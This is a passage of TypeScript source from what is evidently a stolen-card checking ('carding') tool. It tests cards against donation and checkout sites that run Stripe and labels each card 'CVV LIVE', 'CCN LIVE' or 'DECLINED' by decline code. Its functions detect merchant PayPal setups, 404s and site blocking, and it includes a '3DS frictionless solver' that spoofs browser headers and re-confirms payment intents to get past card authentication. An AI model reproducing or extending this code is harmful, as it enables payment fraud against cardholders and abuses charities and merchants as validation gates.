  // 3DS-required / 3DS-failed codes: card is real but blocked by the challenge.
  // Must win over the dead fallthrough and carry the filterable "3DS" tag so it
  // matches the requires_action path. Checked before CCN buckets so the label is
  // explicitly 3DS rather than a generic decline reason.
  if (THREE_DS_LIVE_CODES.includes(errCode)) {
    const tier = cvcCheck === "pass" ? "CVV LIVE" : "CCN LIVE";
    return {
      status: "live",
      response: formatCardResult({
        tier, mark: "?", detail: "3DS Auth Required",
        brand, funding, country, threeDs: "3DS", cvc: cvcMark, billingUsed: cardMeta.billing,
      }),
      code: cvcCheck === "pass" ? "cvv_match" : "requires_action",
      latency: 0, gate: gateName, threeDsAttempt: "challenge_only",
    };
  }

  if (CCN_WRONG_CVV_CODES.includes(errCode)) {
    return {
      status: "live",
      response: formatCardResult({ tier: "CCN LIVE", mark: "?", detail: msg, cvc: "fail", brand, funding, country, billingUsed: cardMeta.billing }),
      code: errCode, latency: 0, gate: gateName,
    };
  }

  if (CCN_LIVE_CODES.includes(errCode)) {
    const tier = cvcCheck === "pass" ? "CVV LIVE" : "CCN LIVE";
    return {
      status: "live",
      response: formatCardResult({ tier, mark: "?", detail: msg, cvc: cvcMark, brand, funding, country, billingUsed: cardMeta.billing }),
      code: cvcCheck === "pass" ? "cvv_match" : errCode, latency: 0, gate: gateName,
    };
  }

  return {
    status: "dead",
    response: formatCardResult({ tier: "DECLINED", mark: "?", detail: msg, brand, funding, country }),
    code: errCode, latency: 0, gate: gateName,
  };
}

/**
 * Sniff whether a gate's response actually came from a PayPal-backed checkout
 * even though our flow ran it through the Stripe path. Real cause: the site
 * loads Stripe.js for *other* widgets (memberships, gift cards) but uses
 * PPCP / PayPal Commerce for the actual donation/order � the detector picked
 * Stripe based on the loaded library, but the real action= endpoint posts to
 * PayPal.
 *
 * When we see one of these tells in the body, returning a generic decline
 * misleads the operator. Surface a clear "wrong gateType" error instead.
 */
/**
 * Detect when an admin-ajax POST got routed to WordPress's 404 handler instead
 * of the action's response handler (real failure on rivernetworkchurch:
 * site moved/rewrote admin-ajax, default URL hit the main router).
 *
 * Two independent signals � HTTP status 404, OR a body that starts with
 * <!doctype/<html and has a 404-shaped title/marker. Mere "404" text inside
 * an otherwise-valid response is NOT enough (some merchant decline messages
 * mention HTTP 404 for unrelated reasons), so we require the structural
 * combination.
 */
/**
 * Bracket-match an inline JS object assignment and return the parsed value.
 *
 * For sites where wp_localize_script (or any JS bundler) emits a config block
 * like `var someVar = { ... };` � we read what JS sees instead of scraping
 * the rendered DOM. Catches schema data that lives in `<script>` blocks but
 * is never written as actual `<input>` tags (e.g. WPFS field definitions).
 *
 * Returns `null` on any failure (variable not present, malformed JSON, etc.).
 * Caller falls back to whatever it does today � this is a strictly-additive
 * source of truth, never a replacement for HTML scraping.
 */
function extractInlineJsObject(html: string, varname: string): any | null {
  const escaped = varname.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const m = new RegExp(`var\\s+${escaped}\\s*=\\s*(\\{)`).exec(html);
  if (!m) return null;
  const start = m.index + m[0].length - 1;
  let depth = 0, end = -1;
  for (let i = start; i < html.length; i++) {
    if (html[i] === "{") depth++;
    else if (html[i] === "}") { depth--; if (depth === 0) { end = i; break; } }
  }
  if (end < 0) return null;
  try { return JSON.parse(html.slice(start, end + 1)); } catch { return null; }
}

/**
 * Probe a WP site's REST namespaces once per check (cheap GET to /wp-json/).
 * Returns the list of named (non-numeric) namespaces, or [] when the API is
 * stripped/blocked � which it is on many sites with security plugins.
 *
 * Strictly informational: knowing `givewp/v2` exists doesn't force us to use
 * it; knowing it DOESN'T exist means we don't waste a roundtrip trying. Caller
 * decides what to do with the result.
 */
async function probeWpRestNamespaces(siteUrl: string, state: SessionState): Promise<string[]> {
  try {
    const resp = await sessionFetch(`${siteUrl}/wp-json/`, state, { timeout: 5000, maxRetries: 0, accept: "application/json" });
    if (!resp.ok) return [];
    const j = JSON.parse(resp.text);
    const ns = Object.keys(j?.namespaces || {});
    // Named namespaces only � security plugins frequently return ["0","1",...]
    // to look valid while exposing nothing real.
    return ns.filter(n => /[a-z]/i.test(n));
  } catch { return []; }
}

function looksLike404Response(body: string, status: number): boolean {
  if (status === 404) return true;
  if (!body) return false;
  if (!/^\s*<(!doctype|html)/i.test(body)) return false;
  return /(page not found|<title>[^<]*not found[^<]*<\/title>|404 error)/i.test(body);
}

function looksLikePayPalResponse(body: string): boolean {
  if (!body) return false;
  // Decisive markers � site replied with PayPal-specific keys / endpoints.
  // Mere mention of "paypal" isn't enough (sites often offer PayPal as one
  // option alongside Stripe); we want signals that the *response* came from
  // a PayPal flow our Stripe POST hit.
  return /\bppc_create_order\b|\bppc_capture_order\b|\bpaypal[_-]commerce\b|\becToken\b|\bpaypal_order_id\b|"paypal":\s*\{|paypal\.com\/sdk\/js/i.test(body);
}

function classifyStripeResponse(responseData: any, gateName: string, cardMeta: CardMeta): CheckResult {
  const { brand, funding, country, threeDs } = cardMeta;
  // Hybrid-site catch � if the response shape looks like PayPal, the gate is
  // misconfigured. Bail with a clear actionable error before mis-classifying.
  const bodyText = typeof responseData === "string" ? responseData : (() => { try { return JSON.stringify(responseData); } catch { return ""; } })();
  if (looksLikePayPalResponse(bodyText)) {
    return {
      status: "error",
      response: `Gate Type Mismatch: site responded with a PayPal-shaped response, but this gate is configured as Stripe. Change gateType to "paypal" (subType="standard" or "givewp_commerce" depending on the form).`,
      code: "gatetype_mismatch_paypal",
      latency: 0,
      gate: gateName,
      rawSnippet: bodyText.slice(0, 500),
    };
  }

  // charge id is present on confirmed PaymentIntents; intent id is the PI/SI id
  const chargeId = chargeIdOf(responseData);
  const intentId: string | undefined =
    (typeof responseData.id === "string" && /^(pi|seti)_/.test(responseData.id)) ? responseData.id : undefined;

  if (responseData.status === "succeeded") {
    const checks = responseData.payment_method?.card?.checks
      || responseData.latest_charge?.payment_method_details?.card?.checks
      || {};
    const m = extractChecks(checks);
    return {
      status: "live",
      response: formatCardResult({
        tier: "CVV LIVE", mark: "?", detail: "Confirmed by Bank",
        brand, funding, country, threeDs,
        cvc: m.cvc, avsZip: m.avsZip, avsAddr: m.avsAddr,
        chargeId, intentId, billingUsed: cardMeta.billing,
      }),
      code: "succeeded",
      latency: 0,
      gate: gateName,
      chargeId, intentId,
    };
  }

  if (responseData.status === "requires_action" || responseData.status === "requires_source_action") {
    const raCvcCheck = responseData.payment_method?.card?.checks?.cvc_check
      || responseData.latest_charge?.payment_method_details?.card?.checks?.cvc_check;
    const raStatusLabel = raCvcCheck === "pass" ? "CVV LIVE" : "CCN LIVE";
    // Distinguish actual hosted-challenge URLs (redirect_to_url) from JS asset
    // URLs (use_stripe_sdk.stripe_js). Only the former is clickable; the
    // latter is loaded by Stripe.js for the device-fingerprint iframe and
    // would just render as a JS blob if an admin tapped it.
    const nextAction = responseData.next_action as Record<string, any> | undefined;
    const redirectUrl = nextAction?.redirect_to_url?.url as string | undefined;
    const threeDsType: "redirect" | "sdk" | "none" = redirectUrl
      ? "redirect"
      : nextAction?.use_stripe_sdk
        ? "sdk"
        : "none";

    // Fire-and-forget 3DS challenge inspection (non-blocking)
    if (redirectUrl) {
      inspectThreeDsChallenge(redirectUrl, { timeoutMs: 8000 })
        .then(insp => {
          if (insp.ok) {
            dbg(`[stripe] 3DS auto-inspect: ${insp.issuer || "unknown issuer"} | ${insp.challengeType || "unknown"} | ${insp.amount || "no amount"}`);
          }
        })
        .catch(e => dbg(`[stripe] 3DS inspect failed: ${e?.message ?? e}`));
    }

    return {
      status: "live",
      response: formatCardResult({
        tier: raStatusLabel, mark: "?",
        detail: threeDsType === "sdk" ? "3DS SDK Fingerprint" : "3DS Auth Required",
        // This transaction hit an actual 3DS wall, so tag "3DS" regardless of
        // the card's static three_d_secure_usage flag � lets downstream filter
        // "needs-3DS" lives from frictionless ones.
        brand, funding, country, threeDs: "3DS",
        cvc: raCvcCheck === "pass" ? "pass" : raCvcCheck === "fail" ? "fail" : "unchecked",
        intentId, billingUsed: cardMeta.billing,
      }),
      code: raCvcCheck === "pass" ? "cvv_match" : "requires_action",
      latency: 0,
      gate: gateName,
      intentId,
      threeDsUrl: redirectUrl,
      threeDsType,
      threeDsAttempt: "challenge_only",
    };
  }

  if (responseData.status === "requires_payment_method") {
    const lastErr = responseData.last_setup_error || responseData.last_payment_error || {};
    const errCode = lastErr.decline_code || lastErr.code || "card_declined";
    const errMsg = lastErr.message || STRIPE_DECLINE_MAP[errCode] || "Card Declined";

    const cvcCheck = lastErr.payment_method?.card?.checks?.cvc_check
      || responseData.payment_method?.card?.checks?.cvc_check
      || responseData.latest_charge?.payment_method_details?.card?.checks?.cvc_check;

    const gatewayErrorCodes = ["processing_error", "rate_limit", "api_connection_error", "api_error"];
    const isGatewayError = gatewayErrorCodes.includes(errCode)
      || (errMsg.includes("integration surface") || errMsg.includes("publishable key"))
      || errCode === "resource_missing"
      || lastErr.type === "invalid_request_error";

    if (isGatewayError) {
      return {
        status: "error",
        response: `Gateway Error: ${STRIPE_DECLINE_MAP[errCode] || errMsg}`,
        code: errCode,
        latency: 0,
        gate: gateName,
      };
    }

    return classifyDeclineCode(errCode, errMsg, cvcCheck, gateName, cardMeta);
  }

  if (responseData.error) {
    const errCode = responseData.error.decline_code || responseData.error.code || "unknown";
    const errMsg = responseData.error.message || STRIPE_DECLINE_MAP[errCode] || "Unknown error";
    const errCvcCheck = responseData.error.payment_method?.card?.checks?.cvc_check;

    const gatewayErrorCodes = ["processing_error", "rate_limit", "api_connection_error", "api_error", "idempotency_error"];
    const isGatewayError = gatewayErrorCodes.includes(errCode)
      || errMsg.includes("integration surface")
      || errMsg.includes("publishable key")
      || errCode === "resource_missing"
      || responseData.error.type === "invalid_request_error";

    if (isGatewayError) {
      return {
        status: "error",
        response: `Gateway Error: ${STRIPE_DECLINE_MAP[errCode] || errMsg}`,
        code: errCode,
        latency: 0,
        gate: gateName,
      };
    }

    return classifyDeclineCode(errCode, errMsg, errCvcCheck, gateName, cardMeta);
  }

  // -- Unknown shape � try the wrapper-normalizer before giving up ----------
  // Stripe-backed gates respond in many wrapper shapes (WC checkout, GiveWP
  // v2/v3, Charitable, Gravity Forms, WCPay, etc.). The branches above
  // handle the native Stripe JSON; the normalizer canonicalizes everything
  // else into the same fields so we can classify it the same way.
  const normalized = normalizeStripeResponse(responseData);
  if (normalized.source !== "unknown") {
    // 3DS / OTP required � promote to live CCN with action-required tag.
    if (normalized.status === "requires_action") {
      return {
        status: "live",
        response: formatCardResult({
          tier: "CCN LIVE", mark: "?", detail: `3DS Auth Required (${normalized.source})`,
          brand, funding, country, threeDs: "3DS", cvc: normalized.cvcCheck || "unchecked",
          intentId: normalized.intentId, billingUsed: cardMeta.billing,
        }),
        code: normalized.code || "requires_action",
        latency: 0,
        gate: gateName,
        intentId: normalized.intentId,
        threeDsType: normalized.nextAction?.redirect_to_url?.url ? "redirect" : "none",
        threeDsUrl: normalized.nextAction?.redirect_to_url?.url,
        threeDsAttempt: "challenge_only",
      };
    }
    if (normalized.status === "succeeded") {
      return {
        status: "live",
        response: formatCardResult({
          tier: "CVV LIVE", mark: "?",
          detail: `Confirmed (${normalized.source})`,
          brand, funding, country, threeDs,
          cvc: normalized.cvcCheck || "pass",
          chargeId: normalized.chargeId, intentId: normalized.intentId, billingUsed: cardMeta.billing,
        }),
        code: "succeeded",
        latency: 0,
        gate: gateName,
        chargeId: normalized.chargeId, intentId: normalized.intentId,
      };
    }
    if (normalized.status === "failed" && normalized.code) {
      // Wrapper gave us a decline_code-shaped string � route through the
      // full classifier so insufficient_funds/incorrect_cvc/etc become
      // proper CCN/CVV LIVE tags instead of generic DECLINED. Tag the wrapper
      // source onto the response so admins can see which shape produced it.
      const declined = classifyDeclineCode(normalized.code, normalized.message || normalized.code, normalized.cvcCheck, gateName, cardMeta);
      return { ...declined, response: `${declined.response} � via ${normalized.source}` };
    }
    if (normalized.status === "failed" && normalized.message) {
      // No code, but we have human text � emit a dead result; the keyword
      // classifier in the bot formatter picks the right tag (HIT / CCN / CVV
      // / 3DS / LOW_FUND / EXPIRED ...) from the message body.
      return {
        status: "dead",
        response: `DECLINED ? ${normalized.message.slice(0, 140)} | ${brand} ${funding} [${country}] � via ${normalized.source}`,
        code: "wrapper_declined",
        latency: 0,
        gate: gateName,
      };
    }
  }

  return {
    status: "error",
    response: `Unexpected response: ${responseData.status || normalized.source}`,
    code: "unknown",
    latency: 0,
    gate: gateName,
  };
}

function classifyBankText(rawText: string, gateName: string, cardMeta: CardMeta): CheckResult {
  // Mismatch sniff first � if the raw response carries decisive PayPal
  // markers, classifying as a Stripe decline would silently bury the real
  // problem (gate is the wrong gateType).
  if (looksLikePayPalResponse(rawText)) {
    return {
      status: "error",
      response: `Gate Type Mismatch: response is PayPal-shaped but this gate is Stripe. Reconfigure gateType to "paypal".`,
      code: "gatetype_mismatch_paypal",
      latency: 0,
      gate: gateName,
      rawSnippet: rawText.slice(0, 500),
    };
  }
  const text = rawText.toLowerCase();
  const { brand, funding, country, threeDs } = cardMeta;
  const b = cardMeta.billing;
  const billSuffix = b ? ` | ?? ${b.zip} ${b.line1}${b.stateCode ? ", " + b.stateCode : ""} ${b.country}` : "";

  if (text.includes('"status":"succeeded"') || text.includes('"status":"success"') ||
      text.includes("payment method successfully added") || text.includes("card successfully added") ||
      text.includes("card has been verified") || text.includes("payment method saved")) {
    return {
      status: "live",
      response: `CVV LIVE ? Bank Confirmed | ${brand} ${funding} [${flagEmoji(country) ? `${flagEmoji(country)} ${country}` : country}] ${threeDs}${billSuffix}`,
      code: "succeeded",
      latency: 0,
      gate: gateName,
    };
  }

  if (text.includes("requires_action") || text.includes("3d secure")) {
    return {
      status: "live",
      response: `CCN LIVE ? 3DS Required | ${brand} ${funding} [${flagEmoji(country) ? `${flagEmoji(country)} ${country}` : country}] 3DS${billSuffix}`,
      code: "requires_action",
      latency: 0,
      gate: gateName,
    };
  }

  const declineCodes: Array<{ pattern: string; code: string; label: string; isLive: boolean; isCcnWrongCvv?: boolean }> = [
    // -- CVV mismatch ? card number valid (CCN LIVE, wrong CVV) ----------------
    { pattern: "incorrect_cvc",              code: "incorrect_cvc",    label: "Incorrect CVC",              isLive: true, isCcnWrongCvv: true },
    { pattern: "incorrect cvc",              code: "incorrect_cvc",    label: "Incorrect CVC",              isLive: true, isCcnWrongCvv: true },
    { pattern: "invalid_cvc",               code: "invalid_cvc",      label: "Invalid CVC",                isLive: true, isCcnWrongCvv: true },
    { pattern: "cvc_check: fail",            code: "incorrect_cvc",    label: "CVC Mismatch",               isLive: true, isCcnWrongCvv: true },
    { pattern: "cvc_check_failed",           code: "cvc_check_failed", label: "CVC Check Failed",           isLive: true, isCcnWrongCvv: true },
    { pattern: "security code is incorrect", code: "incorrect_cvc",    label: "CVC Incorrect",              isLive: true, isCcnWrongCvv: true },
    { pattern: "security code is invalid",   code: "incorrect_cvc",    label: "CVC Invalid",                isLive: true, isCcnWrongCvv: true },
    { pattern: "cvc mismatch",               code: "incorrect_cvc",    label: "CVC Mismatch",               isLive: true, isCcnWrongCvv: true },
    { pattern: "card's security code is",    code: "incorrect_cvc",    label: "CVC Error",                  isLive: true, isCcnWrongCvv: true },
    // -- AVS mismatch ? card number accepted (CCN LIVE, zip wrong) ------------
    { pattern: "incorrect_zip",              code: "incorrect_zip",    label: "AVS Mismatch",               isLive: true },
    { pattern: "zip code",                   code: "incorrect_zip",    label: "AVS Mismatch",               isLive: true },
    { pattern: "postal code",                code: "incorrect_zip",    label: "AVS Mismatch",               isLive: true },
    // -- Card live � issuer-side limit/behavior ---------------------------------
    { pattern: "insufficient_funds",         code: "insufficient_funds",  label: "Insufficient Funds",      isLive: true },
    { pattern: "insufficient funds",         code: "insufficient_funds",  label: "Insufficient Funds",      isLive: true },
    { pattern: "not_sufficient_funds",       code: "not_sufficient_funds", label: "Insufficient Funds",     isLive: true },
    { pattern: "card_velocity_exceeded",     code: "card_velocity_exceeded", label: "Activity Limit",       isLive: true },
    { pattern: "withdrawal_count_limit_exceeded", code: "withdrawal_count_limit_exceeded", label: "Withdrawal Limit", isLive: true },
    { pattern: "do_not_honor",               code: "do_not_honor",     label: "Do Not Honor",               isLive: true },
    { pattern: "do not honor",               code: "do_not_honor",     label: "Do Not Honor",               isLive: true },
    { pattern: "generic_decline",            code: "generic_decline",  label: "Generic Decline",            isLive: true },
    { pattern: "generic decline",            code: "generic_decline",  label: "Generic Decline",            isLive: true },
    { pattern: "call_issuer",                code: "call_issuer",      label: "Call Issuer",                isLive: true },
    { pattern: "call issuer",                code: "call_issuer",      label: "Call Issuer",                isLive: true },
    { pattern: "try_again_later",            code: "try_again_later",  label: "Try Again Later",            isLive: true },
    { pattern: "not_permitted",              code: "not_permitted",    label: "Not Permitted",              isLive: true },
    { pattern: "service_not_allowed",        code: "service_not_allowed",  label: "Service Not Allowed",    isLive: true },
    { pattern: "transaction_not_allowed",    code: "transaction_not_allowed", label: "Transaction Not Allowed", isLive: true },
    { pattern: "issuer_not_available",       code: "issuer_not_available", label: "Issuer Not Available",   isLive: true },
    { pattern: "approve_with_id",            code: "approve_with_id",  label: "Approve With ID",            isLive: true },
    { pattern: "issuer declined",            code: "issuer_declined",  label: "Issuer Declined",            isLive: true },
    { pattern: "online_or_offline_pin_required", code: "online_or_offline_pin_required", label: "PIN Required", isLive: true },
    // -- Soft declines � card reached the bank, real card ---------------------
    // "your card was declined" = bank-issued decline, NOT "card doesn't exist"
    { pattern: "your card was declined",     code: "card_declined",    label: "Card Declined",              isLive: true  },
    // -- Hard dead codes --------------------------------------------------------
    { pattern: "stolen_card",                code: "stolen_card",      label: "Stolen Card",                isLive: false },
    { pattern: "lost_card",                  code: "lost_card",        label: "Lost Card",                  isLive: false },
    { pattern: "expired_card",               code: "expired_card",     label: "Expired Card",               isLive: false },
    { pattern: "card has expired",           code: "expired_card",     label: "Expired Card",               isLive: false },
    { pattern: "fraudulent",                 code: "fraudulent",       label: "Fraudulent",                 isLive: false },
    { pattern: "restricted_card",            code: "restricted_card",  label: "Restricted Card",            isLive: false },
    { pattern: "pickup_card",                code: "pickup_card",      label: "Pick Up Card",               isLive: false },
    { pattern: "security_violation",         code: "security_violation", label: "Security Violation",       isLive: false },
    { pattern: "testmode_decline",           code: "testmode_decline", label: "Test Card Rejected",         isLive: false },
    { pattern: "no_action_taken",            code: "no_action_taken",  label: "No Action Taken",            isLive: false },
    { pattern: "revocation_of_authorization", code: "revocation_of_authorization", label: "Authorization Revoked", isLive: false },
    { pattern: "pin_try_exceeded",           code: "pin_try_exceeded", label: "PIN Tries Exceeded",         isLive: false },
    { pattern: "card does not support",      code: "card_not_supported", label: "Card Not Supported",       isLive: false },
    { pattern: "invalid_number",             code: "invalid_number",   label: "Invalid Card Number",        isLive: false },
    { pattern: "incorrect_number",           code: "incorrect_number", label: "Incorrect Card Number",      isLive: false },
  ];

  for (const dc of declineCodes) {
    if (text.includes(dc.pattern)) {
      if (dc.isCcnWrongCvv) {
        return {
          status: "live",
          response: `CCN LIVE ? CVV Wrong | ${dc.label} | ${brand} ${funding} [${country}]`,
          code: dc.code,
          latency: 0,
          gate: gateName,
        };
      }
      // Strict mode flips the 4 ambiguous live-codes (do_not_honor,
      // generic_decline, call_issuer, naked card_declined) to dead.
      const effectiveLive = dc.isLive && !shouldForceDead(dc.code);
      return {
        status: effectiveLive ? "live" : "dead",
        response: effectiveLive
          ? `CCN LIVE ? ${dc.label} | ${brand} ${funding} [${country}]`
          : `DECLINED ? ${dc.label}${dc.isLive && !effectiveLive ? " (strict)" : ""} | ${brand} ${funding} [${country}]`,
        code: dc.code,
        latency: 0,
        gate: gateName,
      };
    }
  }

  if (text.includes("nonce") && (text.includes("invalid") || text.includes("expired"))) {
    return { status: "error", response: "Session Expired - Retry", code: "nonce_expired", latency: 0, gate: gateName };
  }

  // Refresh/session errors � these mean the form session expired, not a card verdict
  for (const refreshErr of REFRESH_ERRORS) {
    if (text.includes(refreshErr)) {
      return { status: "error", response: "Session Error - Retry", code: "session_error", latency: 0, gate: gateName };
    }
  }

  // Ban signal check � if site is blocking us, report as error not dead
  for (const ban of BAN_SIGNALS) {
    if (text.includes(ban)) {
      return { status: "error", response: "Rate Limited / Blocked by Site", code: "rate_limited", latency: 0, gate: gateName };
    }
  }

  if (text.includes("requires_payment_method") || text.includes("requires_source_action")) {
    try {
      const parsed = JSON.parse(rawText);
      const lastErr = parsed.last_setup_error || parsed.last_payment_error
        || parsed.data?.last_setup_error || parsed.data?.last_payment_error || {};
      const errCode = lastErr.decline_code || lastErr.code || "";
      const cvcCheck = lastErr.payment_method?.card?.checks?.cvc_check
        || parsed.payment_method?.card?.checks?.cvc_check;
      if (errCode) {
        const errMsg = STRIPE_DECLINE_MAP[errCode] || lastErr.message || errCode;
        return classifyDeclineCode(errCode, errMsg, cvcCheck, gateName, { brand, funding, country, threeDs, billing: cardMeta.billing });
      }
    } catch {}
  }

  let errorMsg = "";
  try {
    const parsed = JSON.parse(rawText);
    if (parsed.message) errorMsg = parsed.message;
    else if (parsed.data?.error?.message) errorMsg = parsed.data.error.message;
    else if (parsed.messages) errorMsg = parsed.messages.replace(/<[^>]+>/g, "").trim();
    else if (parsed.data?.message) errorMsg = parsed.data.message;
    const errCode = parsed.data?.error?.decline_code || parsed.data?.error?.code
      || parsed.error?.decline_code || parsed.error?.code || "";
    if (errCode && !errorMsg) errorMsg = STRIPE_DECLINE_MAP[errCode] || errCode;
    if (CCN_LIVE_CODES.includes(errCode) || CCN_WRONG_CVV_CODES.includes(errCode)) {
      const isWrongCvv = CCN_WRONG_CVV_CODES.includes(errCode);
      return {
        status: "live",
        response: isWrongCvv
          ? `CCN LIVE ? CVV Wrong | ${STRIPE_DECLINE_MAP[errCode] || errorMsg} | ${brand} ${funding} [${country}]`
          : `CCN LIVE ? ${STRIPE_DECLINE_MAP[errCode] || errorMsg} | ${brand} ${funding} [${country}]`,
        code: errCode,
        latency: 0,
        gate: gateName,
      };
    }
  } catch {}

  if (/field value must be|unable to recognize your session|form.?nonce|validation.?error|invalid.*field|required.*field/i.test(text)) {
    return { status: "error", response: rawText.substring(0, 200), code: "form_validation", latency: 0, gate: gateName };
  }

  if (!errorMsg || errorMsg.trim().length === 0) {
    errorMsg = rawText.replace(/<[^>]+>/g, "").trim().substring(0, 150) || "Card Declined";
  }

  return {
    status: "dead",
    response: `DECLINED ? ${errorMsg} | ${brand} ${funding} [${country}]`,
    code: "bank_declined",
    latency: 0,
    gate: gateName,
  };
}

// --- 3DS Frictionless Solver (device-fingerprint ? re-confirm) ---------------

/**
 * Mimics the Stripe.js 3DS2 flow server-side:
 *  1. If next_action.use_stripe_sdk.stripe_js is present, GET that iframe URL
 *     so the bank registers a device-fingerprint notification.
 *  2. Re-confirm the PI/SI via the Stripe API.
 *  3. Interpret the re-confirm response:
 *       succeeded / processing   ? frictionless (bank auto-authenticated)
 *       requires_action          ? challenge still needed
 *       requires_payment_method  ? challenge / bank rejected
 *       error                    ? challenge or unknown depending on error type
 */
type ThreeDsVerdict = "frictionless" | "challenge" | "unknown";
interface ThreeDsResult {
  verdict: ThreeDsVerdict;
  chargeId?: string;   // ch_... when the bank auto-settled frictionlessly
  intentId?: string;   // pi_/seti_ id
}

// Pull the charge id out of a confirmed intent payload (string or expanded object).
function chargeIdOf(data: any): string | undefined {
  const lc = data?.latest_charge;
  if (typeof lc === "string" && lc.startsWith("ch_")) return lc;
  if (lc && typeof lc === "object" && typeof lc.id === "string") return lc.id;
  return undefined;
}

async function try3DSReconfirm(
  piId: string,
  clientSecret: string,
  publicKey: string,
  nextAction: Record<string, unknown> | undefined,
  ua: string,
  secChUa: string,
  connectedAccount?: string,
): Promise<ThreeDsResult> {
  const intentType = piId.startsWith("seti_") ? "setup_intents" : "payment_intents";
  const intentId = piId;

  // Best-effort GET of a 3DS step URL (fingerprint iframe or hosted redirect page).
  const visit = async (url: string, timeout: number) => {
    try {
      await fetch(url, {
        method: "GET",
        headers: {
          "User-Agent": ua,
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Sec-Ch-Ua": secChUa,
          "Sec-Ch-Ua-Mobile": "?0",
          "Sec-Fetch-Dest": "iframe",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "cross-site",
        },
        redirect: "follow",
        signal: AbortSignal.timeout(timeout),
      });
    } catch { /* best-effort */ }
  };

  // Retrieve current intent state (used to poll after the fingerprint/redirect).
  const retrieve = async (): Promise<any | null> => {
    try {
      const url = stripeConnectUrl(
        `https://api.stripe.com/v1/${intentType}/${intentId}?key=${publicKey}&client_secret=${encodeURIComponent(clientSecret)}&expand[0]=latest_charge`,
        connectedAccount,
      );
      const r = await fetch(url, {
        headers: { "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
        signal: AbortSignal.timeout(8000),
      });
      return await r.json();
    } catch { return null; }
  };

  try {
    // Step 1 � walk whatever 3DS action the bank handed back.
    const sdkAction = nextAction?.use_stripe_sdk as Record<string, unknown> | undefined;
    const fingerprintUrl = sdkAction?.stripe_js as string | undefined;
    // redirect_to_url is the classic 3DS1 / hosted-challenge fallback.
    const redirectAction = nextAction?.redirect_to_url as Record<string, unknown> | undefined;
    const redirectUrl = (redirectAction?.url as string | undefined)
      || (sdkAction?.three_ds_method_url as string | undefined);

    if (fingerprintUrl) { await visit(fingerprintUrl, 5000); await new Promise(r => setTimeout(r, 1500)); }
    if (redirectUrl)    { await visit(redirectUrl, 6000);    await new Promise(r => setTimeout(r, 1200)); }

    // Step 2 � re-confirm: bank makes the definitive frictionless vs challenge call.
    const reBody = new URLSearchParams({ key: publicKey, client_secret: clientSecret, use_stripe_sdk: "true", "expand[0]": "latest_charge" });
    const reResp = await fetch(
      stripeConnectUrl(`https://api.stripe.com/v1/${intentType}/${piId}/confirm`, connectedAccount),
      {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": ua,
          "Sec-Ch-Ua": secChUa,
          "Sec-Ch-Ua-Mobile": "?0",
          Origin: "https://js.stripe.com",
          Referer: "https://js.stripe.com/",
        },
        body: reBody.toString(),
        signal: AbortSignal.timeout(12000),
      }
    );
    let reData = await reResp.json();

    // Bank auto-authenticated ? frictionless
    if (reData.status === "succeeded" || reData.status === "processing")
      return { verdict: "frictionless", chargeId: chargeIdOf(reData), intentId };

    // Bank rejected payment after fingerprint � not a 3DS challenge
    if (reData.status === "requires_payment_method") return { verdict: "unknown", intentId };

    // Still requires action � poll briefly: many 3DS2 frictionless flows settle a
    // beat after the fingerprint, so don't conclude "challenge" on the first look.
    if (reData.status === "requires_action") {
      for (let i = 0; i < 2; i++) {
        await new Promise(r => setTimeout(r, 1800));
        const polled = await retrieve();
        if (!polled) continue;
        if (polled.status === "succeeded" || polled.status === "processing")
          return { verdict: "frictionless", chargeId: chargeIdOf(polled), intentId };
        if (polled.status === "requires_payment_method") return { verdict: "unknown", intentId };
        reData = polled;
      }
      // Persisted in requires_action across polls ? genuine OTP/biometric challenge.
      return { verdict: "challenge", intentId };
    }

    // Error response � classify by message content
    if (reData.error) {
      const msg = ((reData.error.message || "") + " " + (reData.error.code || "")).toLowerCase();
      if (
        msg.includes("authentication") ||
        msg.includes("3d secure") ||
        msg.includes("challenge") ||
        msg.includes("card_not_supported")
      ) return { verdict: "challenge", intentId };
    }

    return { verdict: "unknown", intentId };
  } catch {
    return { verdict: "unknown", intentId };
  }
}

async function classifyAndUpgrade3DS(
  responseData: Record<string, unknown>,
  gateName: string,
  cardMeta: CardMeta,
  ua: string,
  secChUa: string,
  publicKey: string,
  connectedAccount?: string,
): Promise<ReturnType<typeof classifyStripeResponse>> {
  const base = classifyStripeResponse(responseData, gateName, cardMeta);

  // Only attempt 3DS solve for requires_action / cvv_match codes
  if (base.code !== "requires_action" && base.code !== "cvv_match") return base;

  const piId = responseData.id as string | undefined;
  const clientSecret = responseData.client_secret as string | undefined;
  if (!piId || !clientSecret) return base;

  const nextAction = responseData.next_action as Record<string, unknown> | undefined;
  if (!nextAction) return base;

  dbg(`[3ds] Re-confirm probe for ${piId} (${nextAction.type || "unknown action type"})${connectedAccount ? ` [acct: ${connectedAccount}]` : ""}`);
  const result = await try3DSReconfirm(piId, clientSecret, publicKey, nextAction, ua, secChUa, connectedAccount);
  dbg(`[3ds] Re-confirm result: ${result.verdict}${result.chargeId ? ` (${result.chargeId})` : ""}`);

  const tier: CardResultFormat["tier"] = base.code === "cvv_match" ? "CVV LIVE" : "CCN LIVE";
  const cvc: CheckMark = base.code === "cvv_match" ? "pass" : undefined;
  const intentId = (result.intentId || (piId as string)) as string | undefined;
  const common = {
    tier, mark: "?", cvc,
    brand: cardMeta.brand, funding: cardMeta.funding, country: cardMeta.country, threeDs: cardMeta.threeDs,
    billingUsed: cardMeta.billing,
  };

  if (result.verdict === "frictionless") {
    return {
      ...base, status: "live",
      response: formatCardResult({ ...common, detail: "3DS Frictionless ?", chargeId: result.chargeId, intentId }),
      chargeId: result.chargeId, intentId,
      threeDsType: "none",
      threeDsAttempt: "frictionless_passed",
    };
  }

  if (result.verdict === "challenge") {
    // Frictionless probe was attempted (we re-confirmed) but the bank insists
    // on a full challenge. Only the redirect_to_url shape produces a tappable
    // URL � the sdk shape is for in-browser fingerprinting.
    const redirectUrl = (nextAction?.redirect_to_url as Record<string, any> | undefined)?.url as string | undefined;
    const threeDsType: "redirect" | "sdk" | "none" = redirectUrl
      ? "redirect"
      : nextAction?.use_stripe_sdk
        ? "sdk"
        : "none";
    return {
      ...base, status: "live",
      response: formatCardResult({
        ...common,
        detail: threeDsType === "sdk" ? "3DS Challenge (SDK)" : "3DS Challenge Required",
        intentId,
      }),
